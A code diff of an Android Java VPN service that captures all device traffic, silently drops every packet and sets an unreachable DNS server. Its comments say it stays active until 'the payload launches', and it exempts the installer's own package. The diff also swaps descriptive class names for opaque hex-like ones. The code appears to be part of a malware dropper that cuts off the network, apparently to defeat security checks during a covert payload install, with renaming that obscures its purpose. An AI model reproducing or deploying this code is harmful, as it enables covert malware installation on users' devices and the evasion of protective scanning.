@@ -13,26 +13,24 @@ import java.io.IOException;
  * Null-routing VPN: intercepts all device traffic and silently drops it.
  *
  * How it works:
- *   - Builder establishes a blocking TUN interface with default routes
- *     0.0.0.0/0 + ::/0, so every socket on every app is redirected into our
- *     file descriptor, regardless of whether the underlying network is Wi-Fi
- *     or mobile data.
+ *   - Builder establishes a TUN interface with default routes 0.0.0.0/0 + ::/0,
+ *     so every socket on every app is redirected into our file descriptor.
  *   - sinkPackets() reads packets in a loop and discards them — nothing is
  *     forwarded, so all connections stall.
  *   - A fake DNS server (192.0.2.1, RFC 5737 TEST-NET) is set so domain
  *     resolution also times out.
  *
  * Lifecycle:
- *   - Started from MainActivity after VPN permission is granted.
- *   - Stopped via BlockVpnService.stop(ctx) ONLY after the payload launches.
+ *   - Started from A4450c4b785 after VPN permission is granted.
+ *   - Stopped via V4450c4b785.stop(ctx) ONLY after the payload launches.
  *   - Returns START_NOT_STICKY so the OS never restarts it automatically.
  */
-public class BlockVpnService extends VpnService {
+public class V4450c4b785 extends VpnService {
 
-    static final String TAG = "BlockVpnService";
+    static final String TAG = "V4450c4b785";
 
-    /** Static reference so MainActivity can call stop() directly on the instance. */
-    private static volatile BlockVpnService instance;
+    /** Static reference so A4450c4b785 can call stop() directly on the instance. */
+    private static volatile V4450c4b785 instance;
 
     private ParcelFileDescriptor vpnInterface;
     private Thread               packetSink;
@@ -47,19 +45,19 @@ public class BlockVpnService extends VpnService {
      * Falls back to stopService() if the instance is unavailable.
      */
     public static void stop(Context ctx) {
-        BlockVpnService svc = instance;
+        V4450c4b785 svc = instance;
         if (svc != null) {
             svc.running = false;          // signal the sink thread to exit
             svc.closeInterface();         // close TUN fd (unblocks any blocking read)
             svc.stopSelf();               // tell the OS to destroy this service
         } else {
-            ctx.stopService(new Intent(ctx, BlockVpnService.class));
+            ctx.stopService(new Intent(ctx, V4450c4b785.class));
         }
     }
 
     /** Returns true while the TUN interface is established and running. */
     public static boolean isRunning() {
-        BlockVpnService svc = instance;
+        V4450c4b785 svc = instance;
         return svc != null && svc.running && svc.vpnInterface != null;
     }
 
@@ -82,20 +80,21 @@ public class BlockVpnService extends VpnService {
             // TUN address
             b.addAddress("10.233.0.1", 30);
 
-            // Keep reads blocking so dropped packets remain in the normal
-            // connecting/timeout state instead of failing immediately.
-            b.setBlocking(true);
-
-            // Route ALL IPv4 traffic through the TUN.
+            // Route ALL IPv4 traffic through the TUN
             b.addRoute("0.0.0.0", 0);
 
-            // Route ALL IPv6 traffic too.
+            // Route ALL IPv6 traffic too
             try { b.addRoute("::", 0); } catch (Exception ignored) {}
 
             // Fake DNS — sits in RFC 5737 TEST-NET, unreachable by design.
             b.addDnsServer("192.0.2.1");
 
             b.setMtu(1500);
+
+            // Exclude the installer itself so PackageInstaller session commits
+            // (which are local IPC but some OEMs route through loopback) aren't
+            // accidentally blocked.
+            try { b.addDisallowedApplication(getPackageName()); } catch (Exception ignored) {}
 
             vpnInterface = b.establish();
             if (vpnInterface == null) {
